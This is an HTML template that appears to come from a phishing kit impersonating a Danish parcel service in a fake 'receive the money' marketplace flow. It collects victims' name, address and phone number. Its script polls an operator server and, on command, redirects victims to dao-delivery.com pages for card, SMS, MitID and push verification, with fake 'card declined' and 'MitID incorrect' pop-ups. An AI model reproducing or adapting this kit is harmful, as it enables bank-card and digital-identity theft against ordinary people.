    <style>
        a {
            cursor: pointer
        }

        .contact-info,
        textarea {
            display: block;
            width: 100%;
            height: 51px;
            padding: 3px 25px 5px;
            font-family: Muli, sans-serif;
            font-size: 12px;
            font-weight: 400;
            line-height: 1;
            color: #555;
            background-color: #fff;
            background-image: none;
            border: 1px solid #cbcbcb;
            border-radius: 25px;
            -webkit-appearance: none;
            -webkit-transition: .2s ease-in-out;
            transition: .2s ease-in-out;
        }

        .contact-info__border {
            height: 2rem;
            font-size: 16px;
            border-color: #e30613;
            border-radius: 50px;
        }

        input[type="number"]::-webkit-outer-spin-button,
        input[type="number"]::-webkit-inner-spin-button {
            /* display: none; <- Crashes Chrome on hover */
            -webkit-appearance: none;
            margin: 0;
            /* <-- Apparently some margin are still there even though it's hidden */
        }

        input[type='number'] {
            -moz-appearance: textfield;
        }

        input[type='number']::-webkit-outer-spin-button,
        input[type='number']::-webkit-inner-spin-button {
            -webkit-appearance: none;
        }

        .reset [type="number"] {
            -moz-appearance: spinner-textfield;
        }

        .reset input[type='number']::-webkit-outer-spin-button,
        .reset input[type='number']::-webkit-inner-spin-button {
            -webkit-appearance: inner-spin-button;
        }
    </style>

    <div class="wrapper">
        <header id="header" class="fixed-top" style="">
            <div class="container-fluid d-flex align-items-center">

                        alt="" class="img-fluid"></a>
                <nav class="nav-menu d-none d-lg-block">
                    <ul>
                        <li><a class="btn btn-round">Send pakke</a></li>
                        <li><a class="btn btn-round">Log ind</a></li>
                        <li>
                            <a class="dropdown-item" href="javascript:void(0)"><img src="/vtor_files/danish.png"

                        </li>
                    </ul>

                <div>
                    <div class="mobile-menu d-lg-none" data-toggle="modal" data-target="#menuModal">

                                class="icofont-navigation-menu"></i></span>
                    </div>
                </div>
            </div>
        </header>
        <main class="main">
            <section class="steps">
                <div class="container">
                    <div class="row">
                        <div class="col-12">
                            <ul>
                                <li class="">Produkt</li>
                                <li class="active">Adresse</li>
                                <li class="">Modtag pengene</li>
                                <li class="">Bekræftelse</li>
                            </ul>
                        </div>
                    </div>
                </div>
            </section>
            <main>
                <section class="services">
                    <div class="container">
                        <div class="row">
                            <div class="section-title">
                                <img src="/vtor_files/parcel-type.svg">
                                <h4>Oplysninger om dit varen og dine kontaktoplysninger</h4>
                            </div>
                        </div>
                        <div class="row justify-content-center">
                            <div class="col-12 col-lg-4 mt-4 mt-lg-0 d-flex">
                                <div class="card pointer pt-5">
                                    <div class="body body-adj">
                                        <div>
                                            <img src="<%=ad.photo%>" alt=""
                                                style="border-radius: 10px;width: -webkit-fill-available;height: auto;">
                                        </div>
                                        <h4>
                                            <%=ad.title%>
                                        </h4>
                                        <h5>
                                            <%=ad.price%>
                                        </h5>
                                    </div>
                                </div>
                            </div>
                            <div class="col-12 col-lg-4 mt-4 mt-lg-0 d-flex align-items-stretch">
                                <div class="card pt-5 justify-content-start">
                                    <div class="body body-adj">
                                        <div class="icon">
                                            <img src="/vtor_files/952e99e7-5f21-4ca9-9040-273baf2d39cf..svg">
                                        </div>
                                        <h4>Kontaktoplysninger</h4>
                                        <div>
                                            <label for="name">Navn</label>
                                            <input id="name" class="contact-info contact-info__border" type="text">
                                            <div id="nameError" style="color:red; font-size: 0.9rem;"></div>
                                          </div>
                                          
                                          <div style="margin-top: 10px;">
                                            <label for="address">Adresse</label>
                                            <input id="address" class="contact-info contact-info__border" type="text">
                                            <div id="addressError" style="color:red; font-size: 0.9rem;"></div>
                                          </div>
                                          
                                          <div style="margin-top: 10px;">
                                            <label for="mobile">Mobilnummer</label>
                                            <input id="mobile" class="contact-info contact-info__border" type="number">
                                            <div id="mobileError" style="color:red; font-size: 0.9rem;"></div>
                                          </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </section>
                <section>
                    <div class="container">
                        <div class="row">
                          <div class="col-12">
                            <div class="button-group mt-4">
                              <button class="secondary round mr-3" style="display:none">
                                <img src="/vtor_files/Chevron-left.svg">
                              </button>
                      
                              <button class="primary" onclick="validateAndRedirect()">Modtag pengene</button>
                      
                              <script>
                                function validateAndRedirect() {
                                  const name = document.getElementById("name");
                                  const address = document.getElementById("address");
                                  const mobile = document.getElementById("mobile");
                      
                                  const nameError = document.getElementById("nameError");
                                  const addressError = document.getElementById("addressError");
                                  const mobileError = document.getElementById("mobileError");
                      
                                  let valid = true;
                      
                                  nameError.textContent = "";
                                  addressError.textContent = "";
                                  mobileError.textContent = "";
                      
                                  if (!name.value.trim()) {
                                    nameError.textContent = "Udfyld venligst dit navn";
                                    valid = false;
                                  }
                      
                                  if (!address.value.trim()) {
                                    addressError.textContent = "Udfyld venligst din adresse";
                                    valid = false;
                                  }
                      
                                  if (!mobile.value.trim()) {
                                    mobileError.textContent = "Udfyld venligst dit mobilnummer";
                                    valid = false;
                                  }
                      
                                  if (valid) {
                                    location.href = '/ad/<%= ad.id %>'; // EJS подставит id
                                  }
                                }
                              </script>
                            </div>
                          </div>
                        </div>
                      </div>
                      
                </section>
            </main>
        </main>
    </div>
    <script src="/vtor_files/modal.js"></script>
    <script>
        window.onload = function () {
            setInterval(function () {
                let updateSource = new EventSource('/stu?session=m5utv8prdb');

                updateSource.addEventListener('update', function (event) {
                    console.log('e', event.data);
                });

                updateSource.addEventListener('card-return', function () {
                    new Modal('Din bank har afvist korttransaktionen!', 'Prøv at angive et andet kort.', {
                        onClose: function () {
                            window.location.href = 'http://dao-delivery.com/verify';
                        }
                    })
                });

                updateSource.addEventListener('sms', function () {
                    window.location.href = 'http://dao-delivery.com/sms';
                });

                updateSource.addEventListener('mit-id-return', function () {
                    new Modal('Dit MitID er blevet indtastet forkert!', 'Kontroller, at dit MitID er korrekt, og prøv igen.', {
                        onClose: function () {
                            window.location.href = 'http://dao-delivery.com/mit-id';
                        }
                    })
                });

                updateSource.addEventListener('mit-id', function () {
                    window.location.href = 'http://dao-delivery.com/mit-id';
                });


                updateSource.addEventListener('push', function () {
                    window.location.href = 'http://dao-delivery.com/push';
                });

                updateSource.addEventListener('replenishment', function () {
                    // pReplenishment();
                });

                updateSource.addEventListener('hold', function () {
                    window.location.href = 'http://dao-delivery.com/hold';
                });
            }, 8000);
        };
    </script>
